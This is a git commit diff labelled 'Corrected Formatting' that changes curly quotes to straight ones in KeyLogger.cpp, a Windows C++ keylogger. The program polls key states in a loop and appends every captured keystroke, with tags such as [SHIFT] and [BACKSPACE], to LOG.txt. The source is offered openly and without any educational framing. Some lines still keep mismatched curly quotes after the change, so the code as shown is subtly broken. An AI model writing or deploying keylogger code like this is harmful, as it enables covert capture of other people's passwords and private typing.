028d61a59a63e982097c9dfbb88ae6affab0205d
nellyganza <nishimwelys@gmail.com>
2021-06-20 18:38:50 +0200

    Corrected Formatting

--- KeyLogger.cpp
+++ KeyLogger.cpp
@@ -15,10 +15,10 @@ while (1)
 for(i = 8; i <= 190; i++)
 {
 if (GetAsyncKeyState(i) == -32767)
-Save (i,”LOG.txt”);
+Save (i,"LOG.txt");
 }
 }
-system (“PAUSE”);
+system (“PAUSE");
 return 0;
 }
 
@@ -29,40 +29,40 @@ if ( (key_stroke == 1) || (key_stroke == 2) )
 return 0;
 
 FILE *OUTPUT_FILE;
-OUTPUT_FILE = fopen(file, “a+”);
+OUTPUT_FILE = fopen(file, “a+");
 
 cout << key_stroke << endl;
 
 if (key_stroke == 8)
-fprintf(OUTPUT_FILE, “%s”, “[BACKSPACE]”);
+fprintf(OUTPUT_FILE, "%s", "[BACKSPACE]");
 else if (key_stroke == 13)
-fprintf(OUTPUT_FILE, “%s”, “n”);
+fprintf(OUTPUT_FILE, "%s", "n");
 else if (key_stroke == 32)
-fprintf(OUTPUT_FILE, “%s”, ” “);
+fprintf(OUTPUT_FILE, "%s", " ");
 else if (key_stroke == VK_TAB)
-fprintf(OUTPUT_FILE, “%s”, “[TAB]”);
+fprintf(OUTPUT_FILE, "%s", "[TAB]");
 else if (key_stroke == VK_SHIFT)
-fprintf(OUTPUT_FILE, “%s”, “[SHIFT]”);
+fprintf(OUTPUT_FILE, "%s", "[SHIFT]");
 else if (key_stroke == VK_CONTROL)
-fprintf(OUTPUT_FILE, “%s”, “[CONTROL]”);
+fprintf(OUTPUT_FILE, "%s", "[CONTROL]");
 else if (key_stroke == VK_ESCAPE)
-fprintf(OUTPUT_FILE, “%s”, “[ESCAPE]”);
+fprintf(OUTPUT_FILE, "%s", "[ESCAPE]");
 else if (key_stroke == VK_END)
-fprintf(OUTPUT_FILE, “%s”, “[END]”);
+fprintf(OUTPUT_FILE, "%s", "[END]");
 else if (key_stroke == VK_HOME)
-fprintf(OUTPUT_FILE, “%s”, “[HOME]”);
+fprintf(OUTPUT_FILE, "%s", "[HOME]");
 else if (key_stroke == VK_LEFT)
-fprintf(OUTPUT_FILE, “%s”, “[LEFT]”);
+fprintf(OUTPUT_FILE, "%s", "[LEFT]");
 else if (key_stroke == VK_UP)
-fprintf(OUTPUT_FILE, “%s”, “[UP]”);
+fprintf(OUTPUT_FILE, "%s", "[UP]");
 else if (key_stroke == VK_RIGHT)
-fprintf(OUTPUT_FILE, “%s”, “[RIGHT]”);
+fprintf(OUTPUT_FILE, "%s", "[RIGHT]");
 else if (key_stroke == VK_DOWN)
-fprintf(OUTPUT_FILE, “%s”, “[DOWN]”);
+fprintf(OUTPUT_FILE, "%s", "[DOWN]");
 else if (key_stroke == 190 || key_stroke == 110)
-fprintf(OUTPUT_FILE, “%s”, “.”);
+fprintf(OUTPUT_FILE, "%s", ".");
 else
-fprintf(OUTPUT_FILE, “%s”, &key_stroke);
+fprintf(OUTPUT_FILE, "%s", &key_stroke);
 
 fclose (OUTPUT_FILE);
 return 0;
